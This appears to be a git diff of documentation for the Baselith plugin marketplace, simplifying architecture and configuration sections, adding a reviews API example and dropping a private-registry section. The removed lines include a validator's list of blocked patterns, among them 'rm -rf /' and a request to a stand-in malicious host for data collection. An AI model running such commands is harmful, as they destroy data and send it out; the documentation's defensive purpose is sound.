@@ -23,55 +23,25 @@ The **Plugin Marketplace** is the ecosystem for distributing, discovering, and i
 
 ## Architecture
 
-The Marketplace system consists of three primary components, optimized for production with **S3 Artifact Storage** and **GitHub OAuth2 Authentication**.
+The Marketplace follows a **Hub-and-Edge** architecture where a central server (the Hub) manages the registry of available plugins, and individual Baselith instances (the Edges) discover and install them.
 
-```mermaid
-flowchart TD
-    subgraph Client["Client Instance (Edge)"]
-        CLI[baselith CLI]
-        Inst[Plugin Installer]
-    end
-
-    subgraph Hub["Marketplace Server (Hub)"]
-        Auth[GitHub OAuth / JWT]
-        Registry[Metadata Registry]
-        Security[Bandit Scanner]
-    end
-
-    subgraph Storage["Cloud Infrastructure"]
-        DB[(PostgreSQL + Alembic)]
-        S3[(AWS S3 / MinIO)]
-        Prom[Prometheus Metrics]
-    end
-
-    CLI -- Auth Token --> Auth
-    Auth -- Verified Session --> Registry
-    Registry -- Store Meta --> DB
-    Security -- Scan --> S3
-    Inst -- Presigned URL --> S3
-    Hub -- Metrics --> Prom
-```
-
-| Component    | Technology           | Function                           |
-| :----------- | :------------------- | :--------------------------------- |
-| **Registry** | FastAPI + PostgreSQL | Metadata storage and discovery     |
-| **Auth**     | GitHub OAuth2 + JWT  | Secure publisher identification    |
-| **Storage**  | S3 (Presigned URLs)  | High-availability artifact hosting |
-| **Security** | Bandit SAST          | Automated static code analysis     |
-| **Metrics**  | Prometheus           | API usage and health monitoring    |
+- **Central Hub**: Hosts verified plugin metadata and ZIP artifacts (on S3).
+- **Client Edge**: Your local installation that communicates with the hub to manage extensions.
 
 ---
 
 ## Configuration
 
+For most users, the default client configuration is sufficient.
+
 | Variable                  | Description                     | Default                                |
 | :------------------------ | :------------------------------ | :------------------------------------- |
 | `MARKETPLACE_MODE`        | `server` or `client`            | `client`                               |
 | `MARKETPLACE_CENTRAL_URL` | URL of the central hub          | `https://marketplace.baselithcore.xyz` |
-| `MARKETPLACE_SECRET_KEY`  | Secret for JWT Signing (Server) | **Required in Server mode**            |
-| `GITHUB_CLIENT_ID`        | OAuth Client ID for Login       | Required for Publishing                |
-| `S3_BUCKET`               | S3 Bucket for Plugin ZIPs       | Local disk fallback if empty           |
-| `SENTRY_DSN`              | Error tracking URL              | `None`                                 |
+| `MARKETPLACE_API_KEY`     | Optional key for client auth    | `None`                                 |
+
+!!! info "Advanced Setup"
+    If you wish to host your own private registry or learn about server-side environment variables, please refer to the [Marketplace Plugin Repository](https://github.com/baselithcore/baselithcore-marketplace-plugin).
 
 ---
 
@@ -257,22 +227,26 @@ The validator runs a series of automated checks:
 | **Syntax**       | Quality  | Python code must be syntactically correct      |
 | **Metadata Ext** | Quality  | Robust AST parsing for Python-embedded meta    |
 
-### Detected Dangerous Patterns
+### User Reviews & Ratings
+
+Users can submit reviews and ratings for plugins. Reviews are synchronized between the client and the central hub.
 
 ```python
-# ❌ These patterns will cause validation failure:
+# Fetch reviews for a plugin
+reviews = await registry.get_reviews("weather-agent", limit=5)
 
-import subprocess  # Blocked: Shell access
-import os
-os.system("rm -rf /")  # Blocked: System command
+for r in reviews:
+    print(f"[{r.rating}/5] {r.user_id}: {r.comment}")
 
-import requests
-requests.get("http://malicious.com/collect")  # Warning: Suspicious URL
+# Submit a review (requires authentication in Client mode)
+from plugins.marketplace.models import PluginReview
 
-eval(user_input)  # Blocked: Code execution
-exec(code)  # Blocked: Code execution
-
-__import__("dangerous")  # Blocked: Dynamic import
+new_review = PluginReview(
+    plugin_id="weather-agent",
+    rating=5,
+    comment="Excellent agent, very accurate!"
+)
+await registry.add_review(new_review)
 ```
 
 ---
@@ -357,33 +331,6 @@ baselith plugin deprecate my-plugin@1.0.0 \
 ### 3. Communication
 
 The system automatically notifies users who have installed deprecated versions.
-
----
-
-## Private Registry
-
-For organizations requiring an internal registry:
-
-### Setup
-
-```bash
-# Docker compose for private registry
-docker compose -f docker-compose.registry.yml up -d
-```
-
-### Client Configuration
-
-```env
-PLUGIN_REGISTRY_URL=https://internal-registry.company.com
-PLUGIN_REGISTRY_API_KEY=internal-api-key
-```
-
-### Internal Publishing
-
-```bash
-baselith plugin publish my-internal-plugin \
-  --registry https://internal-registry.company.com
-```
 
 ---
 
